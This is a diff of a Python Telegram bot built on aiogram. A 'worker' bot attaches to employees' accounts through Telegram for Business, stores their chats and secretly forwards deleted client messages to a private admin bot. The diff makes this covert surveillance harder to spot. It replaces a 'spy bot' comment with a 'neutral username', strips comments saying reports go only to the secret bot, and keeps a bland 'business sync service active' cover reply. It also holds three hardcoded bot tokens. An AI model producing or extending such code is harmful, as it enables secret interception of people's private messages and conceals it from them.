@@ -8,10 +8,10 @@ from aiogram.types import Message, BusinessMessagesDeleted, BusinessConnection
 from aiogram.filters import CommandStart
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
 
-# 1. Рабочий бот-шпион (подключается к сотрудникам через Telegram для бизнеса)
-WORKER_BOT_TOKEN = "9209876712:AAFnvmG2g3fZCg2eyaejHUbMc_Xp4_logeo"
+# 1. Рабочий бот-агент с новым нейтральным юзернеймом
+WORKER_BOT_TOKEN = "9037468297:AAHcgo_p0YCXt5YW6YFPkStZ5iv-l-7tGRs"
 
-# 2. Твой личный пульт управления (только для тебя)
+# 2. Твой личный пульт управления
 ADMIN_BOT_TOKEN = "9016978475:AAErV3MiXNyRhXFJns_b6ybiEGtAXmIaG48"
 
 # Твой личный Telegram ID
@@ -61,7 +61,6 @@ async def init_db():
 
 @dp_worker.message(CommandStart())
 async def worker_start(message: Message):
-    # Нейтральный ответ, если сотрудник нажмет /start
     await message.answer("Служба бизнес-синхронизации активна.")
 
 @dp_worker.business_connection()
@@ -76,7 +75,6 @@ async def worker_business_connection(connection: BusinessConnection):
                 "INSERT OR REPLACE INTO accounts (connection_id, user_id, account_name) VALUES (?, ?, ?)",
                 (conn_id, user.id, acc_name)
             )
-            # Отчет идет ТОЛЬКО в твоего админ-бота
             try:
                 await admin_bot.send_message(
                     chat_id=MY_ADMIN_ID,
@@ -101,7 +99,6 @@ async def worker_business_connection(connection: BusinessConnection):
 async def worker_cache_message(message: Message):
     conn_id = message.business_connection_id
 
-    # Игнорируем исходящие сообщения сотрудника
     async with aiosqlite.connect(DB_FILE) as db:
         async with db.execute("SELECT user_id FROM accounts WHERE connection_id = ?", (conn_id,)) as cursor:
             row = await cursor.fetchone()
@@ -187,7 +184,6 @@ async def worker_deleted_messages(event: BusinessMessagesDeleted):
                         f"👤 <b>Клиент:</b> {sender} ({username})"
                     )
 
-                    # Уведомление уходит ТОЛЬКО ТЕБЕ в секретного бота
                     try:
                         if c_type == "text":
                             await admin_bot.send_message(
@@ -459,7 +455,7 @@ async def start_server():
 async def main():
     await init_db()
     await start_server()
-    print("Веб-сервер и оба бота успешно запущены!")
+    print("Система запущена!")
     
     await asyncio.gather(
         dp_worker.start_polling(
